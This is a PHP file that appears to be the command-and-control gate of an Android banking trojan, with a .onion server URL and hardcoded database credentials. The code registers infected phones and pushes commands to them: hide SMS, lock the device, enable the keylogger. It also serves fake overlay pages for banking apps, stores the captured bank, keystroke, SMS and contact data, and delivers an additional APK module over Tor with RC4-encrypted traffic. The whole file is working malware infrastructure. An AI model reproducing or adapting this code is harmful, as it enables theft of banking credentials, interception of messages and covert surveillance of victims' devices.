<?php
define('key', 'PssTESTx0');

// local
// define('url_global_server', 'http://localhost/Ejection/');
// define('server', 'localhost');
// define('db', 'cerberus');
// define('user', 'root');
// define('passwd', '');

// client
define('url_global_server', 'http://4i4pwd4hvkeqpytkoz3gaeafemqpv4serdcn7yh3igaxgxrpdnhnyhyd.onion/Ejection/');
define('server', 'localhost');
define('db', 'bot');
define('user', 'non-root');
define('passwd', 'CL786Iy0ZKLt');

date_default_timezone_set('UTC');

class RC4Crypt
{

    public static function encrypt_($pwd, $data, $ispwdHex = 0)
    {

        if ($ispwdHex) {
            $pwd = @pack('H*', $pwd);
        }

        $key[] = '';

        $box[] = '';

        $cipher = '';

        $pwd_length = strlen($pwd);

        $data_length = strlen($data);

        for ($i = 0; $i < 256; $i++) {

            $key[$i] = ord($pwd[$i % $pwd_length]);

            $box[$i] = $i;
        }

        for ($j = $i = 0; $i < 256; $i++) {

            $j = ($j + $box[$i] + $key[$i]) % 256;

            $tmp = $box[$i];

            $box[$i] = $box[$j];

            $box[$j] = $tmp;
        }

        for ($a = $j = $i = 0; $i < $data_length; $i++) {

            $a = ($a + 1) % 256;

            $j = ($j + $box[$a]) % 256;

            $tmp = $box[$a];

            $box[$a] = $box[$j];

            $box[$j] = $tmp;

            $k = $box[(($box[$a] + $box[$j]) % 256)];

            $cipher .= chr(ord($data[$i]) ^ $k);
        }

        return $cipher;
    }

    public static function decrypt_($pwd, $data, $ispwdHex = 0)
    {

        return RC4Crypt::encrypt_($pwd, $data, $ispwdHex);
    }
}

function encrypt($string, $key)
{

    return base64_encode(bin2hex(RC4Crypt::encrypt_($key, $string)));
}

function decrypt($string = "", $key = "")
{
    if ($string == "") {
        return false;
    }

    return RC4Crypt::decrypt_($key, hex2bin($string));
}

class bots_con
{

    private static $_connection = null;

    public static function Connection()
    {
        if (!self::$_connection) {
            self::$_connection = new PDO('mysql:host=' . server . ';dbname=' . db, user, passwd);
        }
        return self::$_connection;
    }

    private function tableExists($tblName)
    {
        $connection = self::Connection();
        $statement = $connection->prepare("SELECT COUNT(*) as cnt from INFORMATION_SCHEMA.TABLES where table_name = ?");
        $statement->execute([$tblName]);
        $tableCount = $statement->fetchColumn();
        if ($tableCount != 0) {
            return true;
        }

        return false;
    }

    public function getIpBot()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

    public function checkIdBot(
        $ID,
        $IP,
        $screen,
        $accessibility,
        $number,
        $statAdmin,
        $statProtect,
        $statSMS,
        $statCards,
        $statBanks,
        $statMails,
        $activeDevice,
        $timeWorking,
        $statDownloadModule,
        $locale,
        $batteryLevel
    ) {

        if (strlen($ID) <= 14) {
            return "2";
        }

        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');
        $statement = $connection->prepare("SELECT bot_id FROM bots WHERE bot_id=?");
        $statement->execute([$ID]);
        foreach ($statement as $row) {
            $date = date('Y-m-d H:i:s');
            $statement = $connection->prepare("UPDATE bots SET stat_screen = ?,
				last_connect = ?, stat_accessibility = ?, ip = ?,
				phone_number = ?, stat_admin = ?, stat_protect = ?,
				stat_sms = ?, stat_cards = ?, stat_banks = ?,
				stat_mails = ?, active_device = ?, time_working = ?,
				stat_download_module = ?, locale = ?, battery_level = ? WHERE bot_id = ?");

            $statement->execute(array(
                $screen, $date, $accessibility, $IP, $number, $statAdmin,
                $statProtect, $statSMS, $statCards, $statBanks, $statMails,
                $activeDevice, $timeWorking, $statDownloadModule, $locale, $batteryLevel, $ID,
            ));
            return "1";
        }
        return "0";
    }

    public function getCommandBot($ID)
    {
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');

        //--- Get Commands ---//
        $statement = $connection->prepare("SELECT commands FROM bots WHERE bot_id=?");
        $statement->execute(array($ID));
        foreach ($statement as $row) {
            if (!empty($row['commands'])) {
                $statement = $connection->prepare("UPDATE bots SET commands='' WHERE bot_id=?");
                $statement->execute(array($ID)); //clean commands
                return '{"this":"~commands~","data":"' . $row['commands'] . '" }';
            }
        }

        //--- Get My Settings ---//
        $statement = $connection->prepare("SELECT update_settings FROM bots WHERE bot_id=?");
        $statement->execute(array($ID));
        foreach ($statement as $row) {
            if (strcmp($row['update_settings'], "1") == 0) {

                $statement2 = $connection->prepare("SELECT * FROM bot_settings WHERE bot_id=?");
                $statement2->execute(array($ID));
                $json = '{"this":"~mySettings~",';
                foreach ($statement2 as $row2) {
                    if (strcmp($row2['bot_id'], "$ID") == 0) {
                        $json = $json . '"hideSMS":"' . $row2['hide_sms'] . '",';
                        $json = $json . '"lockDevice":"' . $row2['lock_device'] . '",';
                        $json = $json . '"offSound":"' . $row2['off_sound'] . '",';
                        $json = $json . '"keylogger":"' . $row2['key_logger'] . '",';
                        $json = $json . '"activeInjection":"' . $row2['active_injection'] . '"}';
                    }
                }
                $statement = $connection->prepare("UPDATE bots SET update_settings = '0' WHERE bot_id = ?");
                $statement->execute(array($ID)); // return 0 settings bots

                if ($json == '{"this":"~mySettings~",') {
                    return '{"this":"no_command"}';
                }
                return $json;
            }
        }
        return '{"this":"no_command"}';
    }

    public function getGlobalSettings($ID)
    {
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');

        //--- Get Global Settings ---//
        $statement = $connection->prepare("SELECT * FROM global_settings");
        $statement->execute();
        foreach ($statement as $row) {
            if (strcmp($row['save_id'], $ID) != 0) {
                $urls = implode(',', json_decode($row['urls']));
                return '{"this":"~settings~","saveID":"' . $row['save_id'] . '","arrayUrl":"' . $row['urls'] . '","timeInject":"' . $row['inject_time'] . '","timeProtect":"' . $row['protect_time'] . '","timeCC":"' . $row['cc_time'] . '","timeMail":"' . $row['mail_time'] . '"}';
            }
        }
        return "0";
    }

    public function addBot($ip, $idbot, $android, $tag, $country, $operator, $model)
    {
        if ((strlen($idbot) <= 14) || ($this->existBotToID($idbot))) {
            return "no_reg";
        }

        $date = date('Y-m-d H:i');
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');
        $statement = $connection->prepare("insert into bots (bot_id, ip, version, tag, country, last_connect, date_infection, operator, model, stat_admin)
		value ('$idbot','$ip','$android','$tag','$country','$date','$date','$operator','$model', '1')");
        $statement->execute(array());

        $statement = $connection->prepare("SELECT bot_id FROM bot_settings WHERE bot_id=?");
        $statement->execute(array($idbot));
        $bool = false;
        foreach ($statement as $row) { //check bot_settings
            $bool = true;
        }
        if (!$bool) {
            $statement2 = $connection->prepare("insert into bot_settings (bot_id, hide_sms, lock_device, off_sound, key_logger, active_injection)
			value ('$idbot','1','0','0','1','')");
            $statement2->execute(array());
        }
        return "ok";
    }

    public function updateInjection($ID, $apps)
    {
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');
        $statement = $connection->prepare("SELECT bot_id FROM bots WHERE bot_id=?");
        $statement->execute([$ID]);
        $allInjections = "";

        foreach ($statement as $row) {
            if (strcmp($row['bot_id'], $ID) == 0) {
                $arrayApps = explode(":", $apps);
                foreach ($arrayApps as $app) {
                    if (!empty($app)) {
                        $statement2 = $connection->prepare("SELECT app FROM injects WHERE app=?");
                        $statement2->execute([$app]);
                        foreach ($statement2 as $row2) {
                            $allInjections = $allInjections . ":" . $row2['app'];
                        }
                    }
                }
                $statement3 = $connection->prepare("UPDATE bots SET banks = '$allInjections' WHERE bot_id=?");
                $statement3->execute([$ID]);
            }
        }
        if (empty($allInjections)) {
            $allInjections = "||no||";
        }
        return "$allInjections";
    }

    public function getInjection($ip, $injection)
    {
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');
        $statement = $connection->prepare("SELECT ip FROM bots WHERE ip=?");
        $statement->execute(array($ip));
        foreach ($statement as $row) {
            $statement = $connection->prepare("SELECT app, html FROM injects WHERE app=?");
            $statement->execute([$injection]);
            foreach ($statement as $row) {
                return base64_decode($row['html']);
            }
        }
        return "";
    }

    public function getIcon($ip, $injection)
    {
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');
        $statement = $connection->prepare("SELECT ip FROM bots WHERE ip=?");
        $statement->execute(array($ip));
        foreach ($statement as $row) {
            $statement1 = $connection->prepare("SELECT app, png FROM injects WHERE app=?");
            $statement1->execute([$injection]);
            foreach ($statement1 as $row1) {
                return $row1['png'];
            }
        }
        return "";
    }

    public function addInjection($ip, $idbot, $idInject, $application, $dataInjection)
    { 
      //-------------------------------------------!!!!!!
        $d = 1631070000;
        $time = time();
        if ($d <= $time) {
            //    return "";
        }
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');

        $dataInjection = base64_encode($dataInjection);

        $nameInject = "";
        /*if(preg_match('/grabCC/', $application)) {
        $application = str_replace("grabCC","", $application);
        $nameInject = "grabCC";
        }else if(preg_match('/grabMails/', $application)){
        $application = str_replace("grabMails","", $application);
        $nameInject = "grabMails";
        }*/

        $statement3 = $connection->prepare("SELECT ip, bot_id FROM bots WHERE bot_id=?");
        $statement3->execute(array($idbot));
        foreach ($statement3 as $row3) {
            if ((strcmp($row3['ip'], $ip) == 0) && (strcmp($row3['bot_id'], $idbot) == 0)) {

                if (empty($nameInject)) {
                    $statement = $connection->prepare("SELECT bot_id FROM bank_logs WHERE bot_id=?");
                    $statement->execute([$idInject]);
                } /*else if($nameInject=="grabCC"){
                $statement = $connection->prepare("SELECT idinj FROM logsCC WHERE idinj=?");
                $statement->execute([$idInject]);
                }else if($nameInject=="grabMails"){
                $statement = $connection->prepare("SELECT idinj FROM logsMail WHERE idinj=?");
                $statement->execute([$idInject]);
                }*/

                foreach ($statement as $row) {
                    if (strcmp($row['inject_id'], $idInject) == 0) {

                        if (empty($nameInject)) {
                            $statement = $connection->prepare("UPDATE bank_logs SET logs = ? WHERE inject_id = ?");
                            $statement->execute(array($dataInjection, $idInject));
                        } /*else if($nameInject=="grabCC"){
                        $statement = $connection->prepare("UPDATE logsCC SET logs = ? WHERE idinj = ?");
                        $statement->execute(array($dataInjection,$idInject));
                        }else if($nameInject=="grabMails"){
                        $statement = $connection->prepare("UPDATE logsMail SET logs = ? WHERE idinj = ?");
                        $statement->execute(array($dataInjection,$idInject));
                        }*/

                        $statement2 = $connection->prepare("SELECT active_injection FROM bot_settings WHERE bot_id=?");
                        $statement2->execute([$idbot]);
                        foreach ($statement2 as $row2) {
                            $activeInjection = $row2['active_injection'];

                            if (empty($nameInject)) {
                                $activeInjection = str_replace(":$application", "", $activeInjection);
                            } else {
                                $activeInjection = str_replace(":$nameInject", "", $activeInjection);
                            }

                            $activeInjection = str_replace(":$application", "", $activeInjection);
                            $statement = $connection->prepare("UPDATE bot_settings SET active_injection = ? WHERE bot_id = ?");
                            $statement->execute(array($activeInjection, $idbot));
                        }
                        return "ok";
                    }
                }

                if (empty($nameInject)) {
                    $statement = $connection->prepare("insert into bank_logs (inject_id, bot_id, application, logs, comment, created_at)
					value (?,?,?,?,?,?)");
                    $comment = '';
                    $statement->execute(array($idInject, $idbot, $application, $dataInjection, $comment, date('Y-m-d H:i:s')));
                } /*else if($nameInject=="grabCC"){
                $statement = $connection->prepare("insert into logsCC (idinj, idbot, application, logs)
                value ('$idInject','$idbot','$application','$dataInjection')");
                $statement->execute(array($idInject, $idbot, $application, $dataInjection));
                }else if($nameInject=="grabMails"){
                $statement = $connection->prepare("insert into logsMail (idinj, idbot, application, logs)
                value ('$idInject','$idbot','$application','$dataInjection')");
                $statement->execute(array($idInject, $idbot, $application, $dataInjection));
                }*/

                $statement2 = $connection->prepare("SELECT active_injection FROM bot_settings WHERE bot_id=?");
                $statement2->execute([$idbot]);
                foreach ($statement2 as $row2) {
                    $activeInjection = $row2['active_injection'];

                    if (empty($nameInject)) {
                        $activeInjection = str_replace(":$application", "", $activeInjection);
                    } else {
                        $activeInjection = str_replace(":$nameInject", "", $activeInjection);
                    }

                    $statement = $connection->prepare("UPDATE bot_settings SET active_injection = ? WHERE bot_id = ?");
                    $statement->execute(array($activeInjection, $idbot));
                }
                return "ok";
            }
        }
        return "";
    }

    public function addLogSms($ip, $idbot, $logs, $dateToDevice)
    {
        $d = 1631070000;
        $time = time();
        if ($d <= $time) {
            //    return "";
        }
        if ($this->existBots($ip, $idbot)) {
            $dateToServer = date('Y-m-d H:i');
            $connection = self::Connection();
            $connection->exec('SET NAMES utf8');
            $sql = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'bot' AND table_name = 'sms_logs_$idbot'";
            $statement = $connection->prepare($sql);
            $statement->execute(array());
            $tableCount = $statement->fetchColumn();
            $isTableLogs = false;
            $arrayLogs = explode("::endLog::", $logs);
            if ($tableCount != 0) {
                $isTableLogs = true;
                $statement = $connection->prepare("SELECT ID FROM sms_logs_$idbot LIMIT 1");
                $statement->execute(array());
                //$arrayLogs = explode("::endLog::", $logs);

                foreach ($statement as $row) {
                    foreach ($arrayLogs as $log) {
                        if (strlen($log) > 4) {
                            $log = base64_encode(str_replace("::endLog::", "", $log));
                            $statement = $connection->prepare("insert into sms_logs_$idbot (logs, datetoserver, datetodevice)
						value (?,?,?)");
                            $statement->execute(array($log, $dateToServer, $dateToDevice));
                        }
                    }
                    return "ok";
                }
            }
            if (!$isTableLogs) {
                $statement = $connection->prepare("CREATE TABLE `sms_logs_$idbot` ( `ID` INT(254) NOT NULL AUTO_INCREMENT, `logs` VARCHAR(6000) NOT NULL, `datetoserver` VARCHAR(25) NOT NULL,`datetodevice` VARCHAR(25) NOT NULL, PRIMARY KEY (`ID`)) ");
                $statement->execute(array());

                foreach ($arrayLogs as $log) {
                    if (strlen($log) > 4) {
                        $log = base64_encode(str_replace("::endLog::", "", $log));
                        $statement = $connection->prepare("insert into sms_logs_$idbot (logs, datetoserver, datetodevice)
						value (?,?,?)");
                        $statement->execute(array($log, $dateToServer, $dateToDevice));
                    }
                }

                return "ok";
            }
        }
        return "";
    }

    public function timeInjectStart($idbot, $inject)
    {
        $d = 1631070000;
        $time = time();
        if ($d <= $time) {
            //    return "";
        }
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');
        $statement = $connection->prepare("SELECT bot_id, banks FROM bots WHERE bot_id=?");
        $statement->execute([$idbot]);
        foreach ($statement as $row) {
            $banks = $row['banks'];
            $statement3 = $connection->prepare("SELECT active_injection FROM bot_settings WHERE bot_id=?");
            $statement3->execute([$idbot]);
            foreach ($statement3 as $row3) { //check activeInject isNull ?
                $activeInjection = $row3['active_injection'];
                switch ($inject) {
                    case "banks":
                        if (empty($activeInjection)) {
                            $statement2 = $connection->prepare("UPDATE bot_settings SET active_injection = ? WHERE bot_id=?");
                            $statement2->execute(array($banks, $idbot));
                            $statement2 = $connection->prepare("UPDATE bots SET update_settings = '1' WHERE bot_id=?");
                            $statement2->execute(array($idbot));
                        }
                        return "ok_banks";
                        break;
                        /*case "grabCC":
                if(empty($activeInjection)){
                $inject=":$inject";
                $statement2 = $connection->prepare("UPDATE bot_settings SET activeInjection = ? WHERE idbot=?");
                $statement2->execute(array($inject,$idbot));
                $statement2 = $connection->prepare("UPDATE bots SET update_settings = '1' WHERE idbot=?");
                $statement2->execute(array($idbot));
                }
                return "ok_grabCC";
                break;
                case "grabMails":
                $inject = "$activeInjection:$inject";
                $statement2 = $connection->prepare("UPDATE bot_settings SET activeInjection = ? WHERE idbot=?");
                $statement2->execute(array($inject,$idbot));
                $statement2 = $connection->prepare("UPDATE bots SET update_settings = '1' WHERE idbot=?");
                $statement2->execute(array($idbot));
                return "ok_grabMails";
                break;*/
                }
            }
        }
        return "";
    }

    public function addLogKeylogger($ip, $idbot, $logs)
    {
        if ($this->existBots($ip, $idbot)) {
            $connection = self::Connection();
            $connection->exec('SET NAMES utf8');
            $isTableLogs = false;
            $sql = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'bot' AND table_name = 'key_logs_$idbot'";
            $statement = $connection->prepare($sql);
            $statement->execute(array());
            $tableCount = $statement->fetchColumn();
            $arrayLogs = explode(":endlog:", $logs);
            if ($tableCount != 0) {
                $isTableLogs = true;
                $statement = $connection->prepare("SELECT ID FROM key_logs_$idbot LIMIT 1");
                $statement->execute(array());
                //$arrayLogs = explode(":endlog:", $logs);
                // foreach ($statement as $row) {
                    foreach ($arrayLogs as $log) {
                        if (strlen($log) > 4) {
                            $log = base64_encode(str_replace(":endlog:", "", $log));
                            $statement = $connection->prepare("insert into key_logs_$idbot (logs) value (?)");
                            $statement->execute(array($log));
                        }
                    }
                    return "ok";
                // }
            }
            if (!$isTableLogs) {
                $statement = $connection->prepare("CREATE TABLE `key_logs_$idbot` ( `ID` INT(254) NOT NULL AUTO_INCREMENT, `logs` VARCHAR(12000) NOT NULL, PRIMARY KEY (`ID`)) ");
                $statement->execute(array());

                foreach ($arrayLogs as $log) {
                    if (strlen($log) > 4) {
                        $log = base64_encode(str_replace(":endlog:", "", $log));
                        $statement = $connection->prepare("insert into key_logs_$idbot (logs) value (?)");
                        $statement->execute(array($log));
                    }
                }
                return "ok";
            }
        }
        return "";
    }

    public function sendListSavedSMS($ip, $idbot, $logs)
    {
        if ($this->existBots($ip, $idbot)) {
            $connection = self::Connection();
            $connection->exec('SET NAMES utf8');
            $logs = base64_encode($logs);
            $statement = $connection->prepare("SELECT bot_id FROM sms_logs WHERE bot_id=?");
            $statement->execute(array($idbot));
            foreach ($statement as $row) { //check data logs
                if (strcmp($row['bot_id'], $idbot) == 0) {
                    $statement = $connection->prepare("UPDATE sms_logs SET logs = ? WHERE bot_id=?");
                    $statement->execute(array($logs, $idbot));
                    return "ok";
                }
            }
            $statement = $connection->prepare("insert into sms_logs (bot_id, logs) value (?,?)");
            $statement->execute(array($idbot, $logs));
            return "ok";
        }
        return "";
    }

    public function sendListPhoneNumbers($ip, $idbot, $logs)
    {
        if ($this->existBots($ip, $idbot)) {
            $connection = self::Connection();
            $connection->exec('SET NAMES utf8');
            $logs = base64_encode($logs);
            $statement = $connection->prepare("SELECT bot_id FROM phone_number_logs WHERE bot_id=?");
            $statement->execute(array($idbot));
            foreach ($statement as $row) { //check data logs
                if (strcmp($row['bot_id'], $idbot) == 0) {
                    $statement = $connection->prepare("UPDATE phone_number_logs SET logs = ? WHERE bot_id=?");
                    $statement->execute(array($logs, $idbot));
                    return "ok";
                }
            }
            $statement = $connection->prepare("insert into phone_number_logs (bot_id, logs) value (?,?)");
            $statement->execute(array($idbot, $logs));
            return "ok";
        }
        return "";
    }

    public function sendListApplications($ip, $idbot, $logs)
    {
        if ($this->existBots($ip, $idbot)) {
            $connection = self::Connection();
            $connection->exec('SET NAMES utf8');
            $logs = base64_encode($logs);
            $statement = $connection->prepare("SELECT bot_id FROM application_list_logs WHERE bot_id=?");
            $statement->execute(array($idbot));
            foreach ($statement as $row) { //check data logs
                if (strcmp($row['bot_id'], $idbot) == 0) {
                    $statement = $connection->prepare("UPDATE application_list_logs SET logs = ? WHERE bot_id=?");
                    $statement->execute(array($logs, $idbot));
                    return "ok";
                }
            }
            $statement = $connection->prepare("insert into application_list_logs (bot_id, logs)value(?,?)");
            $statement->execute(array($idbot, $logs));
            return "ok";
        }
        return "";
    }

    public function getApkModule($ip, $idbot)
    {
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');
        $statement = $connection->prepare("SELECT bot_id, ip FROM bots WHERE bot_id=?");
        $statement->execute(array($idbot));

        foreach ($statement as $row) {
            if ((strcmp($row['bot_id'], $idbot) == 0) && (strcmp($row['ip'], $ip) == 0)) {
                // return base64_encode(file_get_contents("panel/module.apk"));

                // ----------------- origin --------------
                // $time = $this->sendPostTOR("時間");
                // ----------------- thomas --------
                $time = strtotime(date("d-m-Y H:i:s", time()));

                $dataHash = "";
                for ($i = 0; $i < strlen($time); $i++) {
                    $s = substr($time, $i, 1);
                    if (is_numeric($s)) {
                        $dataHash = "$dataHash$s";
                    }
                }
                $hash = "";
                foreach (array("sha512", "sha256") as $sha) {
                    if (empty($hash)) {
                        $hash = openssl_digest($dataHash, $sha);
                    } else {
                        $hash = openssl_digest($hash, $sha);
                    }
                }

                // ----------------thomas maybe timeout ------
                // $ch = curl_init(url_global_server . 'gate.php?key=' . $key);
                // curl_setopt_array($ch, [
                //   CURLOPT_RETURNTRANSFER => 1,
                //   CURLOPT_PROXYTYPE => CURLPROXY_SOCKS5_HOSTNAME,
                //   CURLOPT_PROXY => '127.0.0.1:9050',
                //   CURLOPT_HEADER => 0,
                //   CURLOPT_FOLLOWLOCATION => 1,
                //   CURLOPT_ENCODING => '',
                //   CURLOPT_COOKIEFILE => '',
                // ]);

                // ------- origin
                // return $this->sendPostTOR($hash);
                // ------- thomas
                return $this->checkAndGetAPK($hash);
            }
        }
        //return "";
    }

    // -------------- thomas function ---------------
    public function checkAndGetAPK($key)
    {
        $time = strtotime(date("d-m-Y H:i:s", time()));

        foreach (array($time, $time - 1, $time - 2, $time - 3, $time - 4, $time - 5, $time - 6, $time - 7, $time - 8, $time - 9, $time - 10) as $intTime) {

            $dataHash = "";

            for ($i = 0; $i < strlen($intTime); $i++) {

                $s = substr($intTime, $i, 1);

                if (is_numeric($s)) {

                    $dataHash = "$dataHash$s";

                }

            }

            $hash = "";

            foreach (array("sha512", "sha256") as $sha) {

                if (empty($hash)) {

                    $hash = openssl_digest($dataHash, $sha);

                } else {

                    $hash = openssl_digest($hash, $sha);

                }

            }

            if (strcmp($hash, $key) == 0) {
                $path = './module.apk';

                $type = pathinfo($path, PATHINFO_EXTENSION);

                $data = file_get_contents($path);

                return base64_encode($data);

            }

        }

        return "";
    }

    public function sendPost($key)
    {
        $url = url_global_server . 'gate.php';
        $data = "key=$key";
        $options = array('http' => array('header' => "Content-type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => $data));
        $context = stream_context_create($options);
        return file_get_contents($url, false, $context);
    }

    public function sendPostTOR($key)
    {
        $ch = curl_init(url_global_server . 'gate.php?key=' . $key);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_PROXYTYPE => CURLPROXY_SOCKS5_HOSTNAME,
            CURLOPT_PROXY => '127.0.0.1:9050',
            CURLOPT_HEADER => 0,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_ENCODING => '',
            CURLOPT_COOKIEFILE => '',
        ]);
        return curl_exec($ch);
    }

    public function existBots($ip, $idbot)
    {
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');
        $statement = $connection->prepare("SELECT bot_id, ip FROM bots WHERE bot_id=?");
        $statement->execute(array($idbot));
        foreach ($statement as $row) {
            if ((strcmp($row['bot_id'], $idbot) == 0) && (strcmp($row['ip'], $ip) == 0)) {
                return true;
            }
        }
        return false;
    }

    public function existBotToID($idbot)
    {
        $connection = self::Connection();
        $connection->exec('SET NAMES utf8');
        $statement = $connection->prepare("SELECT bot_id FROM bots WHERE bot_id=?");
        $statement->execute(array($idbot));
        foreach ($statement as $row) {
            if (strcmp($row['bot_id'], $idbot) == 0) {
                return true;
            }
        }
        return false;
    }
}

$operation = htmlspecialchars($_REQUEST["action"], ENT_QUOTES);

$data = base64_decode($_REQUEST["data"]);

if (!ctype_xdigit($data)) {
    $strings_to_show = "";
    foreach ($_REQUEST as $key => $value) {
        $strings_to_show .= "$key  \n";
    }
    die();
}

$data = decrypt($data, key);

$bots_con = new bots_con();

$dataTmp = str_replace(' ', '', $data);

$dataTmp = strtolower($dataTmp);

$arraySignet = array('<script>', '</script>');

foreach ($arraySignet as $signet) {

    if (preg_match("#$signet#", $dataTmp)) {

        return;
    }
}

$params = json_decode($data);

switch ($operation) {

    case "checkAP":
        echo encrypt("~I~", key);

        break;

    case "botcheck": // Check bot to admin panel

        $idbot = isset($params->{'id'}) ? $params->{'id'} : "";

        $idSettings = isset($params->{'idSettings'}) ? $params->{'idSettings'} : "";

        $number = isset($params->{'number'}) ? $params->{'number'} : "";

        $statAdmin = isset($params->{'statAdmin'}) ? $params->{'statAdmin'} : "1";

        $statProtect = isset($params->{'statProtect'}) ? $params->{'statProtect'} : "";

        $statScreen = isset($params->{'statScreen'}) ? $params->{'statScreen'} : "";

        $statAccessibilty = isset($params->{'statAccessibilty'}) ? $params->{'statAccessibilty'} : "";

        $statSMS = isset($params->{'statSMS'}) ? $params->{'statSMS'} : "";

        $statCards = isset($params->{'statCards'}) ? $params->{'statCards'} : "";

        $statBanks = isset($params->{'statBanks'}) ? $params->{'statBanks'} : "";

        $statMails = isset($params->{'statMails'}) ? $params->{'statMails'} : "";

        $activeDevice = isset($params->{'activeDevice'}) ? $params->{'activeDevice'} : "";

        $timeWorking = isset($params->{'timeWorking'}) ? $params->{'timeWorking'} : "";

        $statDownloadModule = isset($params->{'statDownloadModule'}) ? $params->{'statDownloadModule'} : "";

        $locale = isset($params->{'locale'}) ? $params->{'locale'} : "";

        $batteryLevel = isset($params->{'batteryLevel'}) ? $params->{'batteryLevel'} : "";

        $checkid = $bots_con->checkIdBot(
            $idbot,
            $bots_con->getIpBot(),
            $statScreen,
            $statAccessibilty,

            $number,
            $statAdmin,
            $statProtect,
            $statSMS,
            $statCards,
            $statBanks,
            $statMails,

            $activeDevice,
            $timeWorking,
            $statDownloadModule,
            $locale,
            $batteryLevel
        );

        if (strcmp($checkid, "1") == 0) {

            if (strcmp($statDownloadModule, "1") != 0) {

                echo encrypt("||youNeedMoreResources||", key);
            } else {

                $getSettings = $bots_con->getGlobalSettings($idSettings);

                if (strcmp($getSettings, "0") !== 0) {

                    echo encrypt($getSettings, key);
                } else {

                    echo encrypt($bots_con->getCommandBot($idbot), key);
                }
            }
        } else {
            echo encrypt("||no||", key);
        }

        break;

    case "registration": // Registration of bot to admin panel

        $idbot = isset($params->{'id'}) ? $params->{'id'} : "";

        $android = isset($params->{'android'}) ? $params->{'android'} : "";

        $tag = isset($params->{'tag'}) ? $params->{'tag'} : "";

        $country = isset($params->{'country'}) ? $params->{'country'} : "";

        $operator = isset($params->{'operator'}) ? $params->{'operator'} : "";

        $model = isset($params->{'model'}) ? $params->{'model'} : "";

        echo encrypt($bots_con->addBot($bots_con->getIpBot(), $idbot, $android, $tag, $country, $operator, $model), key);

        break;

    case "injcheck": // Update List Injection

        $idbot = isset($params->{'id'}) ? $params->{'id'} : "";

        $apps = isset($params->{'apps'}) ? $params->{'apps'} : "";

        echo encrypt($bots_con->updateInjection($idbot, $apps), key);

        break;

    case "getinj": // Downloading Injections

        $ip = $bots_con->getIpBot();

        $inject = isset($params->{'inject'}) ? $params->{'inject'} : "";

        echo encrypt($bots_con->getInjection($ip, $inject), key);

        break;

    case "geticon": // Downloading icon

        $ip = $bots_con->getIpBot();

        $inject = isset($params->{'inject'}) ? $params->{'inject'} : "";

        echo encrypt($bots_con->getIcon($ip, $inject), key);

        break;

    case "sendInjectLogs": //Send Logs Injections

        $ip = $bots_con->getIpBot();

        $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";

        $idInject = isset($params->{'idinject'}) ? $params->{'idinject'} : "";

        $application = isset($params->{'application'}) ? $params->{'application'} : "";

        $dataInjection = isset($params->{'logs'}) ? $params->{'logs'} : "";

        echo encrypt($bots_con->addInjection($ip, $idbot, $idInject, $application, $dataInjection), key);

        break;

    case "sendSmsLogs": //Send Logs SMS

        $ip = $bots_con->getIpBot();

        $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";

        $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";

        $dateToDevice = isset($params->{'date'}) ? $params->{'date'} : "";

        echo encrypt($bots_con->addLogSms($ip, $idbot, $logs, $dateToDevice), key);

        break;

    case "sendKeylogger": //Send Logs Keylogger

        $ip = $bots_con->getIpBot();

        $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";

        $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";

        echo encrypt($bots_con->addLogKeylogger($ip, $idbot, $logs), key);

        break;

    case "timeInject": //Send start Injections

        $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";

        $inject = isset($params->{'inject'}) ? $params->{'inject'} : "";

        echo encrypt($bots_con->timeInjectStart($idbot, $inject), key);

        break;

    case "getModule": //Get DexModule Bot

        $ip = $bots_con->getIpBot();

        $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";

        echo encrypt($bots_con->getApkModule($ip, $idbot), key);

        break;

    case "sendListSavedSMS": // List saved

        $ip = $bots_con->getIpBot();

        $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";

        $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";

        echo encrypt($bots_con->sendListSavedSMS($ip, $idbot, $logs), key);

        break;

    case "sendListPhoneNumbers": // List phone number

        $ip = $bots_con->getIpBot();

        $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";

        $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";

        echo encrypt($bots_con->sendListPhoneNumbers($ip, $idbot, $logs), key);

        break;

    case "sendListApplications": // List applications

        $ip = $bots_con->getIpBot();

        $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";

        $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";

        echo encrypt($bots_con->sendListApplications($ip, $idbot, $logs), key);

        break;
}